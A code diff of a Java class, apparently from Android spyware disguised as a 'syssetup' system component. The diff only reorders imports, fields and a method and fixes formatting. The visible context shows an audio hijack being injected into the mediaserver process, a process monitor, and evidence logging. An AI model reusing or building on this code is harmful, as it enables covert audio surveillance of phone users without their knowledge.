@@ -1,5 +1,6 @@
 package com.android.syssetup.util;
 
+import com.android.mm.M;
 import com.android.syssetup.Beep;
 import com.android.syssetup.Root;
 import com.android.syssetup.Status;
@@ -7,7 +8,6 @@ import com.android.syssetup.auto.Cfg;
 import com.android.syssetup.conf.Configuration;
 import com.android.syssetup.evidence.EvidenceBuilder;
 import com.android.syssetup.file.AutoFile;
-import com.android.mm.M;
 
 import java.io.File;
 import java.io.FileInputStream;
@@ -18,9 +18,9 @@ import java.nio.ByteOrder;
 public class Instrument {
 	private static final String TAG = "Instrument";
 	private static final int MAX_KILLED = 3;
+	private static String lib, hijacker, path, dumpPath, pidCompletePath, pidFile;
 	private String proc;
 	private MediaserverMonitor pidMonitor;
-	private static String lib, hijacker, path, dumpPath, pidCompletePath, pidFile;
 	private boolean stopMonitor = false;
 
 	private Thread monitor;
@@ -155,7 +155,7 @@ public class Instrument {
 					killed += 1;
 
 					if (started) {
-						if(Cfg.DEBUG) {
+						if (Cfg.DEBUG) {
 							Check.log(TAG + " (startInstrumentation) Audio Hijack installed");
 						}
 						EvidenceBuilder.info(M.e("Audio injected"));
@@ -250,16 +250,16 @@ public class Instrument {
 		private int cur_pid, start_pid;
 		private int failedCounter = 0;
 
-		public void setPid(int pid) {
-			start_pid = pid;
-		}
-
 		public MediaserverMonitor(int pid) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + "(MediaserverMonitor): starting with pid " + pid);
 			}
 
 			setPid(pid);
+		}
+
+		public void setPid(int pid) {
+			start_pid = pid;
 		}
 
 		@Override
